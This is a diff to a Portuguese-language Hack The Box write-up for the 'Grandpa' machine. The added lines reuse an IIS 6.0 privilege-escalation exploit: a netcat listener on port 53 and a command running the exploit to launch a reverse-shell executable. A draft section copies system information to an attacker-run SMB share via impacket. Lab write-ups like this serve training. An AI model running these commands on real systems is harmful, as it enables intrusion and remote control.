@@ -164,6 +164,15 @@ MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Ele
 done
 ```
 
+Observe que a mesma vuln da [Granny](https://an4kein.github.io/hackthebox/2020/06/24/HTB-Granny/) foi encontrada, entao pra nao perder tempo vou utilizar a mesma exploracao
+
+`sudo rlwrap nc -nlvp 53`
+
+`.\IIS6.0.exe "C:\WINDOWS\Temp\reverse.exe"`
+
+
+![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/7.jpg)
+
 
 
 ## Rascunho
@@ -171,4 +180,9 @@ done
 ```
 systeminfo >> \\10.10.14.36\tools\systeminfo.txt
 sudo python /opt/impacket/examples/smbserver.py tools .
+
+sudo python /usr/share/doc/python3-impacket/examples/smbserver.py tools .
+
+
+
 ```
